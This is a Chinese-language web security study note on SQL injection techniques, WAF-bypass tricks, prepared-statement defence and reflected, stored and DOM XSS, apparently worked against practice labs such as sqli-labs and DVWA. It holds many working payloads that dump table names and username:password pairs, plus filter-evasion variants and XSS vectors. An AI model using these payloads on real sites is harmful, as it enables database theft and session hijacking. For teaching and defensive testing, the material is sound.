  - 布尔盲注：页面无法直接返回内容，只会返回真假，因此就是不断的试错
  - 时间盲注：只能通过页面的时间延迟是否成功执行来判断
- union联合查询注入：将多条语句合并输出
- 宽字节注入：常见于编码不统一，一般是在PHP+MySQL中出现
- 堆查询注入：构造执行多条语句
- 二次注入：先将恶意数据存储在数据库，经过SQL再次读取恶意数据导致注入



#### 闭合判断

**首先判断是数字型还是字符型注入**

```
SELECT * FROM `users` WHERE id= 1;		#整形闭合
SELECT * FROM `users` WHERE id='1'; 	#单引号闭合
SELECT * FROM `users` WHERE id="1";		#双引号闭合
SELECT * FROM `users` WHERE id=('1');	#单引号加括号
SELECT * FROM `users` WHERE id=("1");	#双引号加括号
```

首先尝试，如果报错就是数字型

```
?id=1'
?id=1"
```

如果单引号报错，双引号不报错，就尝试，无报错则单引号闭合，报错则单引号加括号

```
?id=1' --+
```

如果单引号不报错，双引号报错，然后尝试，无报错则双引号闭合，报错则双引号加括号

```
?id=1" --+
```



- 数字型

  参考SQL语句：`select * from table where id={}`

  ```
  ?id=1			正常
  ?id=1'			错误
  ?id=1"			错误
  
  ?id=1 --+		正常
  ?id=1' --+		错误
  ?id=1" --+		错误
  
  ?id=1 and 1=1	正常
  ?id=1 and 1=2	错误
  ```

- 字符型

  这里需要判断是单引号还是双引号，这里以单引号为例子

  参考SQL语句：`select * from table where id='{}'`

  ```
  ?id=1			正常
  ?id=1'			错误
  ?id=1"			正常
  
  ?id=1' and '1'='1	正常
  ?id=1' and '1'='2	错误
  ```

- 搜索型

  参考SQL语句：`select * from table where like '%{}%'`

  ```
  keywords'		错误
  keywords%		错误
  keywords% 'and 1=1 and '%'='		（这个相当于and 1=1）
  keywords% 'and 1=2 and '%'='		（这个相当于and 1=2）
  ```



#### 判断显示位

在页面有回显时，判断数据库有几列，页面显示数据的位置有几个，并且是哪几位

判断闭合后，`闭合 + order by  + --+`

```
?id=1' order by 3 --+		#输入数字，直到回显不正常，即该数据库有几列
```

直到回显不正常，回显正常的最大值就是列数，继续判断显示位

```
?id=1' union select 1,2,3 --+		#输入与列数一样多的数字，判断回显位
```



#### 类型判断

![image-20210313201034833](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313201034833.png)

#### 常用替换payload

| 作用   | PAYLOAD                                                      |
| ------ | ------------------------------------------------------------ |
| 爆库名 | select database()                                            |
| 爆表名 | select group_concat(table_name) from information_schema.tables where table_schema=database() |
| 爆列名 | select group_concat(column_name) from information_schema.columns where table_name='表名' |
| 爆值   | select group_concat(列名,……) from 表名                       |



#### 1.union联合注入

**格式：**?id=0' union select 1,2,**PAYLOAD**--+

> union()：用于合并两个或多个 SELECT 语句的结果集，一起输出。
>
> 注意：UNION 内部的 SELECT 语句必须拥有相同数量的列。因此有时需要占位的字符。



例题的判断闭合为：单引号字符型闭合；数据库3列，其中2，3位回显

**查库名**

```
?id=0' union select 1,2,database() --+		#这里的1,2就是凑列数
```

![image-20210313201759286](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313201759286.png)

**查表名**

```
?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+
```

![image-20210313202051065](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313202051065.png)

查字段

```
?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--+
```

![image-20210313202448350](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313202448350.png)

取得值

```
?id=0' union select 1,2,group_concat('[',username,':',password,']') from users--+
```

![image-20210313202657176](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313202657176.png)



#### 2.布尔型盲注

**格式：**?id=1' and substr(**PAYLOAD**,1,1)>'m'--+

> 可能用到的函数介绍：
>
> length('字符串')：表示返回最左边的N个字符的字符串
>
> left('字符串',N)：返回最左边的N个字符的字符串
>
> substr('字符串',N,M)：截取字符串，从第N个字符开始，到第N+M个字符（从1开始排序）
>
> limit()：limit子句用于限制查询结果返回的数量，常用于分页查询（从0开始排序）
>
> 在布尔型注入中，**正确会回显，错误没有回显**，以此为依据逐字爆破。
>



注入过程：

1. 首先使用**函数length()**判断所需字符有几位，或者判断到最后一位字符为NULL值为止
2. 再使用**函数left()**，或者**函数substr()**判断得到具体值

**技巧：由于比较的是ASCII码的大小，因此可以二分法快速查找**



**爆库名**

```
?id=1' and length(database())=8 --+

?id=1' and substr((select database()),1,1)>'m'--+
?id=1' and substr((select database()),1,1)='s'--+		#二分法快速判断
?id=1' and substr((select database()),1,2)>'sm'--+

?id=1' and substr((select database()),1,8)='security'--+
```

**爆表名**

```
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)='r' --+
```

**爆列名**

```
?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='username' --+
```

**爆字段**

```
?id=1' and substr((select password from users order by id limit 0,1),1,1)='d' --+
```



**布尔注入代码分析**

在注入页面中程序**先获取GET参数lD**,通过**preg_match判断**其中是否存在 union/ sleep/ benchmark等危险字符。然后将参数lD拼接到SQL语句，从数据库中查询，如果有结果，则返回yes,否则返回no。当访问该页面时，代码根据数据库查询结果返回yes或no，而不返回数据库中的任何数据，所以页面上只会显示yes或no



#### 3.时间延迟型盲注

**格式：**?id=1' and if(substr(**PAYLOAD**,1)='s',sleep(5),1)--+

> if(payload,a,b)
>
> 如果payload成立，那么就做a，反之就做b

与布尔盲注类似，只是把判断依据改为了查看页面反应时间

这里只要替换payload就好了，不重复演示了！



#### 4.报错注入

##### 报错注入原理

SQL报错注入就是利用数据库的某些机制，**人为制造错误查询语句，使得查询结果能够出现在错误信息中**。这种手段在联合查询受限且能返回错误信息的情况下比较好用。



**一个例子**，在正常情况下用户发起一个请求：id=1，网站进行一系列处理，网站会把id=1的这条数据返回给用户。

但如果用户构造了一个错误的请求，同样网站进行了一系列处理后，发现没有找到对应数据，网站会把错误信息返回给用户。

那么如果我们在返回的错误信息的地方进行注入，让返回错误信息中返回数据库中的内容，即可以实现SQL注入

**应用场景**

- 查询不回显内容，但会打印错误信息
- Update、 insert等语句，会打印错误信息

**注意：**使用报错注入需要关注数据库版本情况！



##### 报错注入的方法

凡是可以让错误信息显示的函数（语句），都能实现报错注入，常用的有以下3种

- floor()：输出字符长度限制为64个字符，因此会用limit分页
- updatexml()：最长输出32位
- extractvalue()：最长输出32位



##### 3.1.floor报错注入

floor报错注入一般都会有这么几个问题

> Q1：floor()函数是什么？
>
> A1：floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。
>
> Q2：rand(0)是什么意思？
>
> A2：rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成。

**关键的函数：**

- rand()  -----产生0~1的伪随机数
- floor()  -----向下取整数，只保留整数部分
- concat() -----连接字符串
- count()  -----计算总数

**格式1：**Select count(\*),2,concat ('~',**PAYLOAD**,'~', floor (rand(0)*2)) **x** from 表名 group by **x** %23；这里的x是任意添加的，可以替换，但要保证两个一样

**格式2：**Select 1,count(\*),2, from 表名 group by concat ('~',**PAYLOAD**,'~', floor (rand(0)*2)) %23;



**爆库名**

payload填入：database()；除此之外，为了让数据分离出来，我们人为加入`~`让数据分离出来

```
?id=1' union select count(*),2,concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x --+
```

![image-20210314170344525](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210314170344525.png)

爆表名，列名，值都是同理，替换格式的plyload就好了！

**爆表名**

```
# 格式一
?id=1'union select count(*),1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~',floor(rand(0)*2)) as x from information_schema.tables group by x--+

# 格式二
?id=1'union select count(*),2,3 from information_schema.tables group by concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~',floor(rand(0)*2))--+
```

**爆列名**

```
# 爆所有列名（group_concat一列）
?id=1' union select count(*),2,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~',floor(rand(0)*2)) as x from information_schema.columns group by x--+

# 爆所有列名（group_concat一列，去掉前几个不关键的）
?id=1' union select count(*),2,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),'~',floor(rand(0)*2)) as x from information_schema.columns group by x--+

# 爆单个列名（limit控制）
?id=1' union select count(*),2,concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1),'~',floor(rand(0)*2)) as x from information_schema.tables group by x--+

# 爆单个列名（limit控制，去掉前几个不关键的）
?id=1' union select count(*),2,concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1),'~',floor(rand(0)*2)) as x from information_schema.tables group by x--+
```

**爆值**

```
#爆单列的单值
?id=1' union select count(*),2,concat('~',(select username from users limit 1,1),'~',floor(rand(0)*2)) as x from information_schema.tables group by x--+
```



##### 3.2.updatexml & extractvalue报错注入

**格式：**?id=0' and updatexml(1, concat('~',**PAYLOAD**,'~'), 1) --+

​			?id=0' and extractvalue(1,concat('~',PAYLOAD,'~')) --+



updatexml()函数与extractvalue()类似，是用于更新xml文档的函数。这里的报错是因为在payload中**不符合xml格式**，比如格式里的`~`就会导致报错

> **语法：**updatexml(目标xml文档，xml路径，更新的内容)
>
> ​			extractvalue(目标xml文档，xml路径)



**爆库名**

```
?id=0' and updatexml(1, concat('~',database(),'~'), 1) --+

?id=0' and extractvalue(1,concat('~',database(),'~')) --+
```

**爆表名**

```
?id=0' and updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) --+

?id=0' and extractvalue(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~')) --+
```

**爆列名**

```
?id=0' and updatexml(1, concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'), 1) --+

?id=0' and extractvalue(1, concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~')) --+
```

**爆值**

```
?id=0' and updatexml(1, concat('~',(select group_concat(username,':',password) from users),'~'), 1) --+

?id=0' and extractvalue(1, concat('~',(select group_concat(username,':',password) from users),'~')) --+

?id=0' and extractvalue(1, concat('~',(select substring(group_concat(username,':',password),10) from users),'~')) --+	//从第10个字符开始，之后的所有个字符,一次输出最多32个字符
```



##### 总结

利用**updatexml()**函数来进行报错注入点的**创造**，用**concat()**聚合函数来配合**updatexml()**函数来构造**非xml格式的语法**的**“故意出错”**，令**updatexml()**函数返回报错信息，我们就是利用这个报错的信息进行注入，返回**报错信息（我们需要的数据）**



#### 5.堆叠注入查询

**格式：**没有具体格式

堆叠顾名思义就是**多条SQL语句一起执行**。在MySQL中,语句结尾添加`;`表示语句结束。因此我们构造：`SQL语句1;SQL语句2`，并插入查询，就可以达到同时执行两条语句！

这里要区分union联合注入，虽然都是将两条语句合并在一起，但union联合注入或者unionall只能用来执行查询语句，而堆叠注入可以**执行任意类型的语句**。



**注意：**

1. 堆叠注入具有局限性，看数据库系统，也看版本，例如在Oracle数据库中是不支持的
2. 虽然堆叠查询可以执行任意的SQL语句，但是页面一般只能显示前一条语句执行结果，第二条语句我们无法得知它是否执行成功，第二个语句产生错误或者结果只能被忽略。

**例如：**

![QQ截图20210314202255](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210314202255.png)

上传语句

```
?id=0' union select 1,2,database() ; insert into users values (15,"test15","ant15") --+
```

![image-20210314202945697](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210314202945697.png)

查询数据库的结果，发现成功插入一个数据

![image-20210314203000284](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210314203000284.png)



#### 6.二次注入

**过程**

1. 插入恶意代码（转以后将原始数据**存取数据库**且提取时不做过滤）
2. 找到需要使用我们**插入恶意代码**的功能的地方（修改密码、留言板）
3. 正常使用此功能使其**触发之前的恶意代码**，造成SQL注入



**例子**

注册用户名为：`admin'#`，再进行修改密码操作时进行SQL注入

```
UPDATE users SET password='123' where username='admin'#' and password='$password';
```



#### 7.宽字节注入

在宽字节注入页面中，程序获取GET参数ID,并对参数ID使用 addslashes()转义，然后拼接到SQL语句中，进行查询

**例如：**当访问 `id=1'` 时，执行的SQL代码是：`select * from users where id='1\''`。

**注意：**这里的1后面的单引号被转义符 `\` 转义了，造成我们无法注入。所以我们有两个思路。

1. **让斜杠（\）失去作用**

   思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为‘内容’

2. **让斜杠（\）消失**

   这个就是宽字节注入

![image-20210315100327](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210315100327.png)



由于数据库在数据库查询前执行了`set names 'GBK'`，导致两个连在一起的字符会被认为是汉字，我们可以在单引号前加一个字符，使其和斜杠（\）组合被认为成汉字，从未达到让斜杠消失的目的，进而使单引号发挥作用！

> 在GBK编码中，MySQL会认为两个字符是一个汉字（前一个字符的ASCII码要大于128，两个字符才能组合成汉字）
>
> 简单理解就是：注入参数里带入 `％df％27`，即可把 `％5C` （就是转义符）吃掉！

**使用条件：**

1. 使用addslashes()函数（并且开启GPC），或者使用iconv()进行编码转换
2. 数据库编码设置为GBK（php编码为 utf-8 或其他非GBK格式）
3. `%df'` 或者 `%df%27` 
4. `%5c'`或者 `%5c%27` 



爆库

```
%df' union select 1,database()--+	
```

爆表

```
1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

爆字段

```
1%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273(这里为users的16进制表示)--+
```

爆值

```
1%df' union select 1,group_concat(username,0x3b,password) from users--+
```

这都是些常规的payload替换



#### 8.cookie注入

> Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。通常被用来辨别用户身份、进行session跟踪，最典型的应用就是保存用户的账号和密码用来自动登录网站和电子商务网站中的“购物车”。

Cookie注入简单来说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了

**原理：**

通过$\_COOKIE能获取浏览器cookie中的数据，在cookie注入页面中程序通过$_COOKIE获取参数ID,然后直接将ID拼接到select语句中进行查询，如果有结果，则将结果输出到页面



**注入步骤：**

1. 寻找形如 “.asp?id=xx” 类的带参数的URL
2. 去掉“id=xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的
3. 清空浏览器地址栏，输入“javascript:alert(document.cookie="id="+escape("xx"));”，按Enter键后弹出一个对话框，内容是“id=xx”，然后用原来的URL刷新页面，如果显示正常，说明应用使用Request("id")这种方式获取数据的。
4. 重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie="id="+escape("xx and 1=1"));” “JavaScript: alert(document.cookie="id="+escape("xx and 1=2"));”。和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入
5. 使用常规注入语句进行注入即可



例子：

我们输入正确的账号密码（都是admin）后，就会跳到index.php页面

![image-20210315110233556](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210315110233556.png)

当我们再次访问时，我们就不需要输入账号和密码了，因为登录信息已经存在了Cookie中，我们抓个包看看

可以看到，Cookie中有`uname=admin`，说明后台很有可能利用cookie中的uname取数据库中进行查询操作。

我们将cookie中的信息改为uname=admin'

![image-20210315110504900](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210315110504900.png)

页面报错了，并且从报错信息中可以看出，后台使用的是单引号进行的拼凑。后面没有必要继续下去了，联表查询、报错注入、盲注在这里都是可以的！

![image-20210315110728469](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210315110728469.png)



#### 9.base64注入攻击

在base64注入页面中，程序获取GET参数ID,利用base64_decode（）对参数ID进行base64解码，然后直接将解码后的$id拼接到select语句中进行查询，通过while循环将查询结果输出到页面

说白了，就是为了防止明文传输，在传入服务器前进行了base64加密，然后再服务器进行base64解密。常见在Cookie中

![image-20210315111658866](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210315111658866.png)

这里的Cookie先经过了base64加密，再用URL变了码，因此我们需要逆向解密

```
YWRtaW4%3D		#密文
YWRtaW4=		#url解密
admin			#base64解密
```

我们只要把**payload**加密就好了



#### 10.XFF注入攻击

XFF漏洞也称为IP欺骗，有些服务器**通过XFF头判断是否是本地服务器**，当判断为本地服务器时，才能访问相关内容。因此修改XFF头的信息，即可绕过服务器的过滤！

> X-Forwarded-For简称XFF头，它代表了客户端的真实IP，通过修改它的值就可以伪造客户端IP

我们可以设置X-Forwarded-For=`1' union select 1,2,3%23` 相当于`select * from user where 'id'='1'` 和 `union select 1,2,3` 两条，利用第二条语句就可以获取数据库的数据。



**详解**

> PHP中的getenv()函数用于获取一个环境变量的值，类似于$\_SERVERE或$_ENV，返回环境变量对应的值，如果环境变量不存在则返回FALSE
>
> 服务器获取客户端IP地址，程序先判断是否存在HTTP头部参数HTTP_CLIENT_IP，如果存在，则赋给$ip，如果不存在，则判断是否存在HTTP头部参数HTTP_X_FORWARDED_FOR，如果存在，则赋给$ip，如果不存在，则将HTTP头部参数REMOTE_ADDR赋给$ip
>





### SQL绕过技术

#### 1.大小写绕过

由于有黑名单，可利用大小写进行绕过关键词，例如And 1=1（任意字母大小写而都可以，aNd，AND），order 可以改为Order，还有Union等

#### 2.双写绕过

有些数据库会将关键词置换为空，例如我们双写select为selselectect，在经过WAF处理后，又变为了select

常见有：anandd，ororder by，

#### 3.内联注释绕过

内联注释就是把一些特有的仅在MySQL上的语句放在 `/*!...*/` 中，这样这些语句如果在其它数据库中是不会被执行，但在MySQL中会执行。

```
mysql> select * from users where id = -1 union /*!select*/ 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
```

#### 4.编码绕过

编码绕过又分为：

1. 16进制绕过
2. url全编码绕过
3. unicode编码绕过
4. ascii编码绕过

我们只要把查询语句编码就行

#### 5.对空格过滤的绕过

当空格被WAF过滤了，我们有以下几种方法来取代空格

1. /**/

   `select/**/*/**/from/**/users;`

2. ()，用括号分隔开

   `select(id)from(users);`

3. 回车(url编码中的%0a)

4. `(tap键上面的按钮)

   ```
   select`id`from`users`where`id`=1;
   ```

5. tap

6. 两个空格

7. %0A和%A0



#### 6.对or/and的绕过

```
and = &&
or = ||
```

#### 7.对<>绕过

某些网站过滤了“<>”符号才行：

```
unio<>n sel<>ect
```

#### 8.对等号=的绕过

不加通配符的`like`执行的效果和`=`一致，所以可以用来绕过；

`rlike`的用法和上面的`like`一样，没有通配符效果和`=`一样；

regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配

<> 等价于 != ，所以在前面再加一个`!`结果就是等号了

```
?id=1 or 1 like 1
?id=1 or 1 rlike 1
?id=1 or 1 regexp 1
?id=1 or !(1 <> 1)或者1 !(<>) 1
```

#### 9.对单引号的绕过

宽字符

```
# 过滤单引号时
%bf%27  %df%27  %aa%27
```

使用十六进制

```
'users'=>0x7573657273
```

#### 10.对逗号的绕过

盲注中使用 `from n1 for n2` ，其中n1代表从n1个开始读取n2长度的子串

```
select substr("string",1,3);
等价于 select substr("string" from 1 for 3);
```

使用`join`关键字来绕过

```
union select 1,2,3
等价于 union select * from (select 1)a join (select 2)b join(select 3)c
```

使用offset关键字：

```
适用于limit中的逗号被过滤的情况
limit 2,1等价于limit 1 offset 2
```

#### 11.过滤函数绕过

sleep() -->benchmark()

```
and sleep(1)
等价于 and benchmark(1000000000,1)
```

group_concat()–>concat_ws()

```
select group_concat("str1","str2");
等价于 select concat_ws(",","str1","str2");
```

#### 12.拦截select

```
sel<>ect
sele/**/ct
/*!%53eLEct*/
se%0blect
REVERSE(tceles)
%53eLEct
```



### SQL注入防御手段

SQL 注入漏洞存在的原因，就是拼接 SQL 参数。

简单来说有以下几点

1. 过滤危险字符
2. 使用预编译语句（最佳）



**采用SQL语句预编译和绑定变量，是防御SQL注入的最佳方法**

```
String sql = "select id, no from user where id=?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setInt(1, id);
ps.executeQuery();
```

如上所示，就是典型的采用 sql语句预编译和绑定变量 。为什么这样就可以防止sql 注入呢？

采用了PreparedStatement，就**会将sql语句："select id, no from user where id=?" 预先编译好**，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，**只会被当做字符串字面值参数**。所以sql语句预编译可以防御sql注入。





### XSS漏洞

#### XSS简介

**跨站脚本攻击（XSS）**：是一种针对网站应用程序的安全漏洞攻击技术，是**代码注入**的一种。黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。

**XSS跨站脚本攻击本身对Web服务器没有直接危害**，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。

**造成XSS漏洞普遍流行的原因如下:**

1. Web浏览器本身的设计不安全，无法判断JS代码是否是恶意的
2. 输入与输出的Web应用程序基本交互防护不够
3. 程序员缺乏安全意识，缺少对XSS漏洞的认知
4. XSS触发简单，完全防御起来相当困难

漏洞通常是**通过PHP的输出函数将JavaScript代码输出到html页面中**，通过用户本地浏览器执行的，所以XSS漏洞关键就是**寻找参数未过滤的输出函数**。

下面的HTML代码就演示了一个最基本的XSS弹窗：

```html
<html>
<head>XSS</head>
<body>
<script>alert("XSS")</script>
</body>
</html>
```

直接在HTML页面通过`<script>`标签来执行了javaScript内置的`alert()`函数，达到弹出消息框弹窗的效果：

![img](https://image.3001.net/images/20200109/15785725632937.png)



XSS攻击就是将非法的JavaScript代码注入到用户浏览的网页上执行，而Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码本身是否对用户有害。

> 参考：https://segmentfault.com/a/1190000019980090、https://www.sqlsec.com/2020/01/xss.html



#### XSS的危害

诚然，XSS可能不如SQL注射、文件上传等能够直接得到较高操作权限的漏洞，但是它的运用十分灵活（这使它成为最深受黑客喜爱的攻击技术之一），只要开拓思维，适当结合其他技术一起运用，XSS的威力还是很大的。可能会给网站和用户带来的危害简单概括如下：

1. 网络钓鱼
2. 盗取用户cookies信息
3. 劫持用户浏览器
4. 强制弹出广告页面、刷流量
5. 网页挂马
6. 进行恶意操作，例如任意篡改页面信息
7. 获取客户端隐私信息
8. 控制受害者机器向其他网站发起攻击
9. 结合其他漏洞，如CSRF漏洞，实施进一步作恶
10. 提升用户权限，包括进一步渗透网站
11. 传播跨站脚本蠕虫等



#### XSS分类

**1、反射型XSS**

反射型XSS又称**<非持久型XSS>**，**这种攻击方式往往具有一次性**

**攻击方式：**

1. A给B发送一个恶意构造的URL
2. B打开目标网站，浏览器将包含恶意代码的数据通过请求传递给服务端，其不加处理直接返回给浏览器
3. B的浏览器接收到响应后解析并执行的代码中包含恶意代码
4. A的恶意代码可以拥有B的持有权限，进而获取B的数据或者冒充B的行为



假设一个页面把用户输入的参数直接输出到页面上：

```php
<?php
$input = $_GET['param'];
echo "<h1>".$input."</h1>";
?>
```

用户向`param`提交的数据会展示到`<h1>`的标签中展示出来，比如提交:

```
http://127.0.0.1/test.php?param=Hello XSS
```

会得到如下结果:

![img](https://image.3001.net/images/20200109/1578577230860.jpg)



此时查看页面源代码，可以看到：

```html
<h1>Hello XSS</h1>
```

此时如果提交一个JavaScript代码:

```
http://127.0.0.1/test.php?param=<script>alert(233)</script>
```

会发现，`alert(233)`在当前页面执行了：

![img](https://image.3001.net/images/20200109/1578577808625.jpg)

再查看源代码：

```html
<h1><script>alert(233)</script></h1>
```

用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持久型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过**短网址缩短**或者**转换为二维码**等形式灵活运用。

**总结：**常见于网站搜索栏，登录注册等地方窃取用户cookies或者进行钓鱼欺骗，它需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容）



**2、存储型XSS**

存储型XSS又称**<持久型XSS>**，**攻击脚本将被永久地存放在目标服务器的数据库**或文件中，**具有很高的隐蔽性**，最典型的例子是留言板XSS。

**攻击方式：**

1. A将恶意代码提交到目标网站的数据库中
2. B打开目标网站，服务端将恶意代码从数据库取出拼接在HTML中返回给浏览器
3. B的浏览器接收到响应后解析并执行的代码中包含恶意代码
4. A的恶意代码可以拥有B的持有权限，进而获取B的数据或者冒充B的行为



为了复现存储型XSS，这里我们得用到数据库，本地新建一个名字叫做`xss`的数据库，里面新建一个`message`表，用来存放用户的留言信息，字段名分别是`id`、`username`、`message`

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15785779184007.png)

在配置好前端和后端的代码之后，我们通过http服务去访问，可以得到如下界面：

> 这里特别感谢来自国光师傅的演示

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15785780357392.png)

这一过程十分简单，用户在前端输入留言，后端存入数据库，就可以看到自己的留言信息了。代码中没有任何过滤，直接将用户的输入的语句插入到了`html`网页中，当其他人访问的时候同样也能看到

当攻击者直接在留言板块插入`alert('鸡你太美')`，会导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗，除非从数据库中删除这条语句：

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/15785780742673.png)

**总结：**这种攻击**多见于论坛、博客和留言板**，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。**当其他用户测览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行**。

例如，恶意攻击者在留言板中加入以下代码

```
<script>alert(/hacker by hacker/)</script>
```

当其他用户访问留言板时，就会看到个弹窗。可是普通用户所看的URL却是正常的，因此存储型XSS的攻击是最隐蔽的也是危害比较大的，它能让所有访问这个页面的用户都将成为受害者！



**3、DOM型XSS**

通过**修改页面的DOM节点**形成的XSS，称之为**DOM Based XSS**。从效果来说，也是反射型。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。

**攻击方式：**

1. A给B发送一个恶意构造的URL
2. B打开恶意URL
3. B的浏览器页面中包含恶意代码
4. A的恶意代码可以拥有B的持有权限，进而获取B的数据或者冒充B的行为

从方式来看，DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞

HTML的标签都是节点，而这些节点组成了DOM的整体结构一一节点树。通过HTML DOM，树中的所有节点均可通过JavaScript进行访可。所有HTML元素（节点）均可被修改，也可以创建或删除节点。

**HTML DOM树：**

![HTML DOM Node Tree](https://www.w3school.com.cn/i/ct_htmltree.gif)

在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。

**攻击方式：**用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。



#### 大致对比

| 类型 | DOM型                 | 反射式                | 存储式                                     |
| :--: | --------------------- | --------------------- | ------------------------------------------ |
| 触发 | 用户打开恶意构造的URL | 用户打开恶意构造的URL | 1, 用户打开恶意构造的URL 2, 攻击者构造脚本 |
| 储存 | URL                   | URL                   | 数据库                                     |
| 输出 | 前端                  | 后端                  | 后端                                       |
| 方式 | DOM                   | HTTP响应              | HTTP响应                                   |



#### 1.反射型XSS攻击

##### 常用XSS攻击构造

**直接构造：**

```
xss=<script>alert(/2333/)</script>
```

**通过点击（事件）激活：**

```
'onclick='alert(/2333/);
'onclick=alert(/2333/)//
"onclick=alert(document.domain); id="a

'onmouseover=alert(/2333/)//
```

URL型用，**JavaScript伪类：javascript:**，的使用

```
javascript:alert(/2333/);
```

**伪造闭合：**

```
"><script>alert(/2333/)</script>

"><a onclick=alert(/2333/);></a>
```

**img标签构造：**

```
<img src=1 onerror=alert(/2333/)>
```

**iframe标签构造**：

```
<iframe onload=alert(/2333/)>
```

**a标签构造+URL截断（&#09）：**

```
"><a href="javascr&#09;ipt:alert(document.domain);">xxxxx</a>
```

**隐藏input，找到\<input\>标签中的name：**

```
?name="type="text" onmouseover="alert(/2333/) 
```

**IE浏览器特性：**

```
``onmouseover=alert(document.domain);
```



**我们以DVWA的平台作为示例**

##### 反射 XSS LOW

